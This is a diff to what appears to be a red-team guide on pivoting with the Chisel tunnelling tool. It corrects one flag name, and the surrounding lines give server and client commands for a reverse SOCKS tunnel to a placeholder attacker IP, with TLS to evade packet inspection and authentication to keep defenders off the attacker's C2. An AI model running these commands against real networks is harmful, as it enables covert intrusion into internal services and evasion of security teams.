@@ -41,7 +41,7 @@ The attacker wants to reach a specific internal service (e.g., an RDP server at 
 
 - **TLS / HTTPS Masking**: Chisel supports TLS natively to avoid Deep Packet Inspection (DPI) flagging plain WebSockets.
   - Server: `./chisel server -p 443 --reverse --socks5 --tls-cert cert.pem --tls-key key.pem`
-  - Client: `./chisel client https://<ATTACKER_IP> R:socks` (Add `--skip-tls-verification` if using self-signed certs).
+  - Client: `./chisel client https://<ATTACKER_IP> R:socks` (Add `--tls-skip-verify` if using self-signed certs).
 - **Authentication**: Prevent Blue Teams or scanners from hijacking your Chisel C2:
   - Add `--auth user:password` to both client and server executions.
 
